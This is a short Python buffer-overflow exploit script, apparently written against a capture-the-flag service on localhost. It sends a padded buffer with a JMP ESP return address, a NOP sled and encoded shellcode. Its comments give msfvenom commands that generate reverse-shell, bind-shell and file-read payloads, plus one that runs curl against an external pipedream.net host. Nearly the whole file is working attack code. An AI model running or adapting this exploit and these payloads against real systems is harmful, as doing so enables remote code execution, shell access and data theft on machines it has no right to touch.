#!/usr/bin/python
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 9999))

print(client.recv(1024))

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b '\x00' -f python
# msfvenom -p linux/x86/exec CMD="curl https://en4i3omt29wvgco.m.pipedream.net" -b '\x00' -f python
# msfvenom -p linux/x86/shell_bind_tcp PORT=1337 -b '\x00' -f python
# msfvenom -p linux/x86/read_file PATH=flag.txt FD=4 -b '\x00' -f python

# FD = 4
buf = b"A" * 1044
buf += b"\xe2\x92\x04\x08"  # ropper found JMP ESP
buf += b"\x90" * 10
buf += b"\xd9\xec\xd9\x74\x24\xf4\x5a\x31\xc9\xbe\x8b\x25\xd9"
buf += b"\x0b\xb1\x12\x83\xc2\x04\x31\x72\x15\x03\x72\x15\x69"
buf += b"\xd0\x32\x3d\xd5\x1e\xc5\x42\x25\x7a\xf4\x8b\xe8\xfc"
buf += b"\x7f\xc8\x4a\xff\x7f\xcf\xaa\x89\x67\x46\x53\x33\x67"
buf += b"\x49\xa3\x44\xa5\xe9\x2a\x86\x8d\xee\x2c\x07\xee\x55"
buf += b"\x28\x07\xee\xa9\xfd\x87\x56\xa8\xfd\x87\xa6\x10\xfd"
buf += b"\x87\xa6\x66\x30\x07\x4e\xa3\x35\xf7\x70\x4a\xa5\x69"
buf += b"\xe8\xbd\x41\x12\x82\xc1"


client.send(buf)
print(client.recv(1024))
client.close()
